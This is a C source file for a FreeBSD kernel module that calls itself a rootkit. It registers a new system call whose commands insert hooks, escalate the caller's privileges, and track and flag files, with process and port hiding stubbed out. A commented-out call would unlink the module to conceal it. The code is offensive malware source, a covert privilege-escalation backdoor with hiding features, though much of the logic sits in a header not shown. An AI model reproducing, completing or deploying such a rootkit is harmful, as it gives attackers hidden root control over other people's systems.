#include "rootkit.h"

struct node * first_node = NULL;

/* The system call's arguments. */
struct rootkit_args {
	int command;
	char ** args;
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

void a_func(void);

void a_func() {
	uprintf("WHAT?!\n");
}

/* The system call function. */
static int main(struct thread *td, void *syscall_args) {

	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	long resp;

	switch(uap->command){
		case 0:// Unload
			break;
		case 1:// Insert Hooks
			insert_hooks();
			break;
		case 2:// Remove Hooks
			remove_hooks();
			break;
		case 3:// Escalate
			elevate(td);
			break;
		case 4:// Add file to tracker
			add_file(uap->args[0]);
			break;
		case 5:// Remove file from tracker
			remove_file(uap->args[0]);
			break;
		case 6:// Set tracker flags
			resp = strtol(uap->args[1], NULL, 16);
			set_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 7:// Unset tracker flags
			resp = strtol(uap->args[1], NULL, 16);
			unset_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 8://Hide process
			break;
		case 9://Unhide process
			break;
		case 10://Hide port
			// resp = strtol(uap->args[0], NULL, 10);
			// port_hiding((u_int16_t)resp);
			break;
		case 11://Unhide port
			break;
		case 12:
			break;
		case 13:
			break;

		default:
			break;
	}

	return(0);
}

/* The sysent for the new system call. */
static struct sysent rootkit_sysent = {
	2,			/* number of arguments */
	main		/* implementing function */
};


/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	char buf[256] = {0};
	int testfd = 0;

	switch (cmd) {
		case MOD_LOAD:
			//mod_unlink(module, cmd, arg);

			snprintf(buf, 256, "%d\n", offset);

			filewriter_openlog(curthread, &testfd, LOGFILE);
			filewriter_writelog(curthread, testfd, buf, strlen(buf));
			filewriter_closelog(curthread, testfd);
			break;

		case MOD_UNLOAD:
			remove_hooks();
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

